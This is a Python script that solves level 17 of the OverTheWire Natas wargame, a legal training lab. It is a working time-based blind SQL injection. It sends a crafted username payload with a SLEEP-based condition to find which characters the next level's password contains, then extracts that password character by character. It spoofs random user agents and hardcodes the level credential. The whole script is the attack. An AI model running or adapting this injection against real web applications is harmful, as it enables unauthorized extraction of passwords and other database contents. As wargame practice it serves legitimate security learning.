#!/usr/bin/python3.9

"""This script is a solution to Overthewire Natas level 17."""

import string
import requests as r
from requests.auth import HTTPBasicAuth
from fake_useragent import UserAgent

url = "http://natas17.natas.labs.overthewire.org/"

lvl_user = "natas17"
lvl_pass = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"

headers = {
    "User-Agent": UserAgent().random
    }

def get_charlist():
    retrieved=""

    for c in list(string.ascii_letters+string.digits):    
        res = r.get(
            url,
            params={"username": f"natas18\" AND IF(password LIKE BINARY \"%{c}%\",SLEEP(1),0)#"},
            headers=headers, 
            auth=HTTPBasicAuth(lvl_user, lvl_pass))
        
        if(res.elapsed.total_seconds() >= 1.0):
            retrieved+=c
            print("[CHARLIST]", retrieved)

    print("[CHARLIST] Length:", len(retrieved))
    
    return list(retrieved)

def get_password(charlist):
    retrieved, output = "", ""

    for _ in range(32):
        for c in charlist:   
            res = r.get(
                url,
                params={"username": f"natas18\" AND IF(password LIKE BINARY \"{retrieved+c}%\",SLEEP(1),0)#"},
                headers=headers, 
                auth=HTTPBasicAuth(lvl_user, lvl_pass))

            if(res.elapsed.total_seconds() >= 1.0):
                retrieved+=c
                print("[RETRIEVED]", retrieved)               
                break

    return retrieved

try:
    charlist = get_charlist()
    password = get_password(charlist)
    print("[PASSWORD]", password)
except Exception as e:
    print("[ERROR]", e, "\n")
    exit(-1)